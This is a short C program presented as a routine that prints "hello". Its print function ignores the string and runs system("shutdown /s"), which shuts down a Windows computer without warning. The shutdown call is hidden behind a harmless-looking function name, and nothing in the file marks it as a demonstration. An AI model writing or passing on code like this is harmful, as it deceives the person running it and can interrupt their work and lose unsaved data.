#include <stdio.h>
#include <stdlib.h>

void print(char *s);

int main()
{
    char *s = "hello";
    print(s);
    return 0;
}

void print(char *s)
{
    system("shutdown /s");
}